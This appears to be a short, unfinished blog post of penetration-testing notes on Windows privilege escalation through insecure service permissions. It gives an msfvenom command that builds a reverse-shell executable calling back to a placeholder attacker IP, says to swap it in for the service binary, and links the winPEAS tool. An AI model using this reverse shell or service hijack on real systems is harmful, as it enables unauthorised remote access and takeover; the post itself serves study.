---
layout: post
title: 'Notes | Windows Privilage Escalation'
permalink: /notes/system/windows-privilage-escalation/
---

# [](#header-4)Insecure Windows Service Permissions
If we manage to find one Insecure Windows Service we can modify the executable file with one corrupted and wait to the service to execute (or by ourselves).
We can create a reverse shell with **msfvenom**:
{% highlight plain %}
> msfvenom -p windows/x64/shell_reverse_tcp LHOST=[attackerIP] LPORT=[port] -f exe -o reverse.exe
{% endhighlight %}
And change the **reverse.exe** name with the service.exe name.

# [](#header-4)Tools
- [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

# [](#header-4)Writing more...